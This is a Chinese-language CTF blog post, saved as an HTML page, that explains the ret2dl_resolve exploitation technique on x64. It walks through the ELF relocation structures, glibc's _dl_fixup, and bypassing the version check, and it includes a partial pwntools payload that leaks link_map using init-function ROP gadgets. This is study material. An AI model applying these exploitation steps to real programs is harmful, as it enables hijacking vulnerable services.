@@ -1,0 +1,1744 @@
+<!DOCTYPE html>
+<html  lang="zh">
+<head>
+    <meta charset="utf-8">
+<title>ret2dl_resolve x64 study - Junay的博客</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+
+
+    <meta name="description" content="前言&amp;emsp;&amp;emsp;这篇文章记录ret2dl_resolve在x64下的运用场景，这里有2个例子。">
+<meta name="keywords" content="ctf,ret2dl_resolve">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2dl_resolve x64 study">
+<meta property="og:url" content="http://yoursite.com/2019/03/ret2dl_resolve_x64/index.html">
+<meta property="og:site_name" content="Junay的博客">
+<meta property="og:description" content="前言&amp;emsp;&amp;emsp;这篇文章记录ret2dl_resolve在x64下的运用场景，这里有2个例子。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/images/posts/pwn/50.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/pwn/49.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/pwn/51.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/pwn/52.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/pwn/53.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/pwn/54.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/pwn/55.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/pwn/56.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/pwn/57.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/pwn/58.png">
+<meta property="og:updated_time" content="2019-03-14T03:47:35.496Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ret2dl_resolve x64 study">
+<meta name="twitter:description" content="前言&amp;emsp;&amp;emsp;这篇文章记录ret2dl_resolve在x64下的运用场景，这里有2个例子。">
+<meta name="twitter:image" content="http://yoursite.com/images/posts/pwn/50.png">
+
+
+
+
+
+<link rel="icon" href="/images/favicon.png">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+    
+    <style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+    
+
+    
+    
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+    
+
+    
+    
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+
+    
+    
+    
+    
+
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+<link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/logo.svg" alt="ret2dl_resolve x64 study" height="28">
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">Home</a>
+                
+                <a class="navbar-item"
+                href="/archives">Archives</a>
+                
+                <a class="navbar-item"
+                href="/categories">Categories</a>
+                
+                <a class="navbar-item"
+                href="/tags">Tags</a>
+                
+                <a class="navbar-item"
+                href="/about/index.html">About</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                    
+                    
+                    <a class="navbar-item" target="_blank" title="Download on GitHub" href="https://github.com/delcoding">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                    
+                
+                
+                
+                <a class="navbar-item search" title="搜索" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-6-widescreen has-order-2 column-main"><div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2019-03-13T16:00:00.000Z">2019-03-14</time>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    22 分钟 读完 (大约 3316 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                ret2dl_resolve x64 study
+            
+        </h1>
+        <div class="content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;这篇文章记录<code>ret2dl_resolve</code>在<code>x64</code>下的运用场景，这里有2个例子。</p>
+<a id="more"></a>
+<h3 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h3><p>&emsp;&emsp;在x64下，ret2dl_resolve的利用有了一点变化，主要是两个结构体，如下：<br><figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// Elf64_Rela</span></span><br><span class="line"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint64_t</span> Elf64_Addr;</span><br><span class="line"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint64_t</span> Elf64_Xword;</span><br><span class="line"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">int64_t</span>  Elf64_Sxword;</span><br><span class="line"> </span><br><span class="line"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><br><span class="line"><span class="hljs-class">&#123;</span></span><br><span class="line">  Elf64_Addr        r_offset;                <span class="hljs-comment">/* Address */</span></span><br><span class="line">  Elf64_Xword        r_info;                 <span class="hljs-comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf64_Sxword        r_addend;              <span class="hljs-comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">//Elf64_Sym</span></span><br><span class="line"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint32_t</span> Elf64_Word;</span><br><span class="line"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint16_t</span> Elf64_Section;</span><br><span class="line"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint64_t</span> Elf64_Addr;</span><br><span class="line"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint64_t</span> Elf64_Xword;</span><br><span class="line"> </span><br><span class="line"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><br><span class="line"><span class="hljs-class">&#123;</span></span><br><span class="line">  Elf64_Word        st_name;                <span class="hljs-comment">/* Symbol name (string tbl index), 4 bytes */</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>        st_info;             <span class="hljs-comment">/* Symbol type and binding, 1 byte */</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> st_other;                   <span class="hljs-comment">/* Symbol visibility, 1 byte */</span></span><br><span class="line">  Elf64_Section        st_shndx;            <span class="hljs-comment">/* Section index, 2 bytes */</span></span><br><span class="line">  Elf64_Addr        st_value;               <span class="hljs-comment">/* Symbol value, 8 bytes */</span></span><br><span class="line">  Elf64_Xword        st_size;               <span class="hljs-comment">/* Symbol size, 8 bytes */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;_dl_fixup的源码如下，也可以<a href="https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html" target="_blank" rel="noopener">在这里</a>找到：<br><figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (</span><br><span class="line"># ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS</span><br><span class="line">	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"># endif</span><br><span class="line">	   struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-title">ElfW</span><span class="hljs-params">(Sym)</span> *<span class="hljs-keyword">const</span> symtab</span></span><br><span class="line"><span class="hljs-function">    </span>= (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *strtab = (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">const</span> PLTREL *<span class="hljs-keyword">const</span> reloc</span><br><span class="line">    = (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-title">ElfW</span><span class="hljs-params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-title">ElfW</span><span class="hljs-params">(Sym)</span> *refsym </span>= sym;</span><br><span class="line">  <span class="hljs-keyword">void</span> *<span class="hljs-keyword">const</span> rel_addr = (<span class="hljs-keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">  <span class="hljs-keyword">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">/* Sanity check that we're really looking at a PLT relocation.  */</span></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line">   <span class="hljs-comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="hljs-comment">      used don't look in the global scope.  */</span></span><br><span class="line">  <span class="hljs-keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">r_found_version</span> *<span class="hljs-title">version</span> = <span class="hljs-title">NULL</span>;</span></span><br><span class="line"></span><br><span class="line">      <span class="hljs-keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="hljs-literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-title">ElfW</span><span class="hljs-params">(Half)</span> *vernum </span>=</span><br><span class="line">	    (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="hljs-number">0x7fff</span>;</span><br><span class="line">	  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">	  <span class="hljs-keyword">if</span> (version-&gt;hash == <span class="hljs-number">0</span>)</span><br><span class="line">	    version = <span class="hljs-literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="hljs-comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="hljs-comment">	 not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="hljs-comment">	 we are not using any threads (yet).  */</span></span><br><span class="line">      <span class="hljs-keyword">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">      <span class="hljs-keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">	&#123;</span><br><span class="line">	  THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">	  flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">				    version, ELF_RTYPE_CLASS_PLT, flags, <span class="hljs-literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">      <span class="hljs-comment">/* We are done with the global scope.  */</span></span><br><span class="line">      <span class="hljs-keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">	THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="hljs-comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="hljs-comment">	 of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="hljs-comment">	 offset.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">				   SYMBOL_ADDRESS (result, sym, <span class="hljs-literal">false</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="hljs-comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="hljs-comment">	 address) is also known.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, <span class="hljs-literal">true</span>));</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">  value = elf_machine_plt_value (l, reloc, value);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (sym != <span class="hljs-literal">NULL</span></span><br><span class="line">      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="hljs-number">0</span>))</span><br><span class="line">    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">  <span class="hljs-keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">    <span class="hljs-keyword">return</span> value;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>其中，Rel64_Rela的取值方式发生了变化，不再是x86中采用的<code>DT_JMPREL + reloc_offset</code>直接寻址，而采用：</p>
+<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> PLTREL *<span class="hljs-keyword">const</span> reloc</span><br><span class="line">    = (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;这里的<code>reloc_offset</code>是该条目的在<code>.rel.plt</code>数组中的<code>index</code>，所以构造时要除以rela的大小，也就是<code>/ 24</code>。</p>
+<p>&emsp;&emsp;其汇编体现如下：<br><figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code <span class="hljs-keyword">for</span> function _dl_fixup:</span><br><span class="line">   <span class="hljs-number">0x00007f69d60ab9f0</span> &lt;+<span class="hljs-number">0</span>&gt;:	push   rbx</span><br><span class="line">   <span class="hljs-number">0x00007f69d60ab9f1</span> &lt;+<span class="hljs-number">1</span>&gt;:	mov    r10,rdi   ; link_map addr</span><br><span class="line">   <span class="hljs-number">0x00007f69d60ab9f4</span> &lt;+<span class="hljs-number">4</span>&gt;:	mov    esi,esi  ;  rel_offset</span><br><span class="line">   <span class="hljs-number">0x00007f69d60ab9f6</span> &lt;+<span class="hljs-number">6</span>&gt;:	lea    rdx,[rsi+rsi*<span class="hljs-number">2</span>]</span><br><span class="line">   <span class="hljs-number">0x00007f69d60ab9fa</span> &lt;+<span class="hljs-number">10</span>&gt;:	sub    rsp,<span class="hljs-number">0x10</span></span><br><span class="line">   <span class="hljs-number">0x00007f69d60ab9fe</span> &lt;+<span class="hljs-number">14</span>&gt;:	mov    rax,QWORD PTR [rdi+<span class="hljs-number">0x68</span>] ; DT_STRTAB</span><br><span class="line">   <span class="hljs-number">0x00007f69d60aba02</span> &lt;+<span class="hljs-number">18</span>&gt;:	mov    rdi,QWORD PTR [rax+<span class="hljs-number">0x8</span>]  ; </span><br><span class="line">   <span class="hljs-number">0x00007f69d60aba06</span> &lt;+<span class="hljs-number">22</span>&gt;:	mov    rax,QWORD PTR [r10+<span class="hljs-number">0xf8</span>] ; DT_JMPREL</span><br><span class="line">   <span class="hljs-number">0x00007f69d60aba0d</span> &lt;+<span class="hljs-number">29</span>&gt;:	mov    rax,QWORD PTR [rax+<span class="hljs-number">0x8</span>]  ; </span><br><span class="line">   <span class="hljs-number">0x00007f69d60aba11</span> &lt;+<span class="hljs-number">33</span>&gt;:	lea    r8,[rax+rdx*<span class="hljs-number">8</span>]           ; fetch reloc</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;<code>rsi</code>即是传入的<code>reloc_offset</code>，可以看到<code>r8 = rax + rsi * 3 * 8</code>。</p>
+<p>&emsp;&emsp;另一个需要注意的地方是：<br><figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="hljs-literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-title">ElfW</span><span class="hljs-params">(Half)</span> *vernum </span>=</span><br><span class="line">    (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">    ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="hljs-number">0x7fff</span>;</span><br><span class="line">    version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">    <span class="hljs-keyword">if</span> (version-&gt;hash == <span class="hljs-number">0</span>)</span><br><span class="line">    version = <span class="hljs-literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;因为<code>r_info</code>我们会伪造的很大，以获得Rel64_Sym，所以在取出<code>ndx</code>时也会过大，从而导致<code>&amp;l-&gt;l_versions[ndx]</code> segment fault，造成程序崩溃，所以我们需要做的是控制程序流<code>不进入</code>这个if，也就是说让：<br><figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">l-&gt;l_info[VERSYMIDX (DT_VERSYM)] == <span class="hljs-literal">NULL</span></span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;那么这个位置具体在哪呢，通过汇编，我们可以知道，它在：<br><figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">0x00007f69d60aba51</span> &lt;+<span class="hljs-number">97</span>&gt;:	mov    rax,QWORD PTR [r10+<span class="hljs-number">0x1c8</span>]</span><br><span class="line"><span class="hljs-number">0x00007f69d60aba58</span> &lt;+<span class="hljs-number">104</span>&gt;:	test   rax,rax</span><br><span class="line"><span class="hljs-number">0x00007f69d60aba5b</span> &lt;+<span class="hljs-number">107</span>&gt;:	je     <span class="hljs-number">0x7f69d60abb10</span> &lt;_dl_fixup+<span class="hljs-number">288</span>&gt;</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;这里的<code>r10</code>就是link_map地址，所以我们需要先将<code>r10+0x1c8</code>的地方设置成<code>0x0</code>，这比x86的利用多了一步，我们要先<code>leak</code>出来link_map的地址，然后在写0。</p>
+<p>&emsp;&emsp;以上就是前景知识。下面看2个demo。</p>
+<h3 id="DEMO0"><a href="#DEMO0" class="headerlink" title="DEMO0"></a>DEMO0</h3><p>&emsp;&emsp;这道题有明显的栈溢出，并且有read、write，所以我们第一步就要先leak link_map的地址，在x64中，采用寄存器传参，所以对于需要传<code>三个</code>参数的函数，一般比较难直接找到gadget。ROPgadget里找不到合适的gadget：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000000b73 : pop rdi ; ret</span><br><span class="line">0x0000000000000b71 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x0000000000000b6d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000000008c4 : push rbp ; mov rbp, rsp ; call rax</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;所以我们要另想办法，在很多程序的开始执行过程中经常存在<code>init, xx_init</code>之类的函数在，这些函数中可能存在如下可利用的gadget:<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000B50 4C 89 EA                 mov     rdx, r13</span><br><span class="line">.text:0000000000000B53 4C 89 F6                 mov     rsi, r14</span><br><span class="line">.text:0000000000000B56 44 89 FF                 mov     edi, r15d</span><br><span class="line">.text:0000000000000B59 41 FF 14 DC              call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:0000000000000B5D 48 83 C3 01              add     rbx, 1</span><br><span class="line">.text:0000000000000B61 48 39 EB                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000000B64 75 EA                    jnz     short loc_B50</span><br><span class="line">.text:0000000000000B66</span><br><span class="line">.text:0000000000000B66    loc_B66:          ; CODE XREF: init+34↑j</span><br><span class="line">.text:0000000000000B66 48 83 C4 08              add     rsp, 8</span><br><span class="line">.text:0000000000000B6A 5B                       pop     rbx</span><br><span class="line">.text:0000000000000B6B 5D                       pop     rbp</span><br><span class="line">.text:0000000000000B6C 41 5C                    pop     r12</span><br><span class="line">.text:0000000000000B6E 41 5D                    pop     r13</span><br><span class="line">.text:0000000000000B70 41 5E                    pop     r14</span><br><span class="line">.text:0000000000000B72 41 5F                    pop     r15</span><br><span class="line">.text:0000000000000B74 C3                       retn</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;所以我们可以通过两段gadget传值，先用<code>pop</code>，然后在<code>mov</code>过去，同时注意将rbp=1, rbx=0。</p>
+<p>&emsp;&emsp;在这道题中遇到的另一个问题是<code>溢出的字节太少</code>，使用init的gadget，可以看到要<code>6个pop</code>，在这个环境中，我们没有那么多空间。那怎么解决这个问题呢？</p>
+<p>&emsp;&emsp;我们从pop的gadget中可以看到pop的寄存器都不是常用寄存器，r12这些很可能在整个函数中都没有使用过，也就是说我们可以在pop设置好寄存器后不立即调用mov,call，因为溢出太小布局不了，我们再回到存在漏洞的函数，然后在激活第二个gadget。</p>
+<p>&emsp;&emsp;以泄露link_map为例：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># pause()</span></span><br><span class="line">vuln_func = base_addr + <span class="hljs-number">0x0000000000000A44</span></span><br><span class="line"></span><br><span class="line">payload = <span class="hljs-string">'b'</span> * <span class="hljs-number">24</span> + p64(init_gadget_1) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(write_got)</span><br><span class="line">payload += p64(<span class="hljs-number">8</span>) + p64(link_map_addr) + p64(<span class="hljs-number">1</span>) + p64(vuln_func)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 这里又跳转到原漏洞的逻辑处理</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># pause()</span></span><br><span class="line">payload = padding + p64(init_gadget_2) + <span class="hljs-string">'a'</span> * <span class="hljs-number">56</span> + p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># init_gadget_2 为激发mov,call r12.</span></span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;并且为了解决多次ROP的需求，我们要连续<code>迁栈，控rip</code>，这里我们可以使用<code>pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</code>这个gadget达到目的。</p>
